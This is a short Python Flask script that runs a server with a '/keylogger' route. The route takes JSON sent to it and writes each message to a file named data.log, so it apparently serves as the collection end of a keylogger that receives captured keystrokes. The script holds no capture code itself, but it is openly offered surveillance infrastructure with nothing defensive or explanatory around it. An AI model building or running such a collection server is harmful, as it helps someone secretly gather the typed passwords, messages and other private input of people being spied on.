import logging
import json
from flask import Flask, request, jsonify


logging.basicConfig(filename="data.log", level=logging.INFO)
app = Flask(__name__)

@app.route('/keylogger', methods=['POST', 'GET'])
def log():
    message = request.get_json()
    logging.info(message)
    response = {'msg': 'received'}
    return jsonify(response)

app.run()
